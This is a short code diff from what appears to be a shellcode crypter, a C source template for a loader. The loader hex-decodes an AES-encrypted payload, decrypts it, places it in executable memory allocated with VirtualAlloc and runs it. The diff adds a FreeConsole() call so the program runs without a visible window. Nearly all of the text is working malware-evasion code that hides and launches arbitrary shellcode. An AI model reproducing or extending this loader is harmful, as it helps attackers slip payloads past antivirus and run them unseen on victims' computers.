@@ -32,6 +32,7 @@ const char *CRYPTER_BASE_SOURCE =
     "char t[3];int i;for(i=0;i<len/2;++i){memset(t,(char)0x00,3);memcpy(t,h,2);o[i]=(char)strtoul(t,NULL,16);h=h+2;}"
     "}"
     "\nint main(){"
+    "FreeConsole();" // REMOVE THIS LINE IF YOU WANT TO SEE THE EXE CONSOLE
     "int pl=strlen(p),kl=strlen(k),il=strlen(i);struct AES_ctx ctx;unsigned char dp[sizeof(p)/2],dk[sizeof(k)/2],di[sizeof(i)/2];hex2bin(p,dp,pl);hex2bin(k,dk,kl);hex2bin(i,di,il);AES_init_ctx_iv(&ctx,dk,di);AES_CBC_decrypt_buffer(&ctx,dp,sizeof(dp));void *e=VirtualAlloc(0,sizeof(dp),MEM_COMMIT,PAGE_EXECUTE_READWRITE);memcpy(e,dp,sizeof(dp));((void(*)())e)();return 0;"
     "}";
 
